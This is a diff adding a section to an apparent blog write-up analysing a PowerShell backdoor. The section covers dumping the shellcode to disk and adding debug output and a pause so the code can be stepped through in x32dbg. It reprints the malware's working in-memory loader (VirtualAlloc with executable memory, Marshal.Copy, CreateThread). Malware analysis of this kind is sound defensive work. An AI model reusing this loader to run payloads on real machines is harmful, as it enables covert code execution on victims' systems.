@@ -56,3 +56,38 @@ $valloc_addr = $win32_funcs::VirtualAlloc(0,[Math]::Max($payload_bytes.Length,0x
 
 $win32_funcs::CreateThread(0,0,$valloc_addr,0,0,0)
 {% endhighlight %}
+
+<br>
+### 2. Shellcode Analysis
+To extract the contents of $payload_bytes to a file, the following line was used. 
+
+{% highlight powershell %}
+[System.IO.File]::WriteAllBytes("C:/users/root/Desktop/shell.sc", $payload_bytes);
+{% endhighlight %}
+
+<br>
+Notable was the shellcode's length at 510 bytes - irregularly long, at least in my experience. It doesn't stand out as any of Metasploit's shells. 
+
+To facilitate debugging, I added code to the malware to help locate the shellcode in memory, and delay its execution until requested. 
+
+`echo $valloc_addr` prints out the address of the allocated memory.
+`Read-Host` delays execution of shellcode until an input is made through the command line.
+
+{% highlight powershell %}
+$valloc_addr = $win32_funcs::VirtualAlloc(0,[Math]::Max($payload_bytes.Length,0x1000),0x3000,0x40)
+echo $valloc_addr
+[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes,0,$valloc_addr,$payload_bytes.Length)
+
+Read-Host
+$win32_funcs::CreateThread(0,0,$valloc_addr,0,0,0)
+{% endhighlight %}
+
+<br>
+Printed in the console is the memory address casted to an integer. Conversion of the integer to a hexadecimal number wields 107347969 = 0x06660000.
+
+![address_ps](/assets/post_assets/simple-powershell-backdoor/address_ps.png)
+
+<br>
+Tied with x32dbg to reveal the shellcode in memory. A breakpoint can then be set.
+
+![x32_sc](/assets/post_assets/simple-powershell-backdoor/x32_sc.png)
